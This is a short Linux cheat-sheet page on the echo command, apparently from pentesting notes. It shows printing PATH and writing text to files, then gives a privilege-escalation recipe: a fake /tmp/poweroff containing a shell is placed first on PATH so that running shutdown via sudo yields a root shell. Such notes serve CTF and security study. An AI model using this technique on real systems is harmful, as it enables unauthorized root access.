---
title: Echo
desc: In addition to the output of string, there are other uses such as the privileges escalation.
tags: [Linux, PrivEsc]
alts: []
website:
---

## Directories specified by PATH

```sh
echo $PATH
```

<br />

## Add text to file

```sh
# Add text
echo "Hello World" >> sample.txt

# Overwrite (original contents disappears)
echo "Hello World" > sample.txt

# Enable escape
echo -e "Hello\nWorld" > sample.txt
```

<br />

## Privilege Escalation

```sh
# option 1
echo /bin/sh > /tmp/poweroff
# option 2
echo /bin/bash > /tmp/poweroff

chmod +x /tmp/poweroff
export PATH=/tmp:$PATH

# Some SUID command
sudo /usr/sbin/shutdown

# Then you are root user
root>
```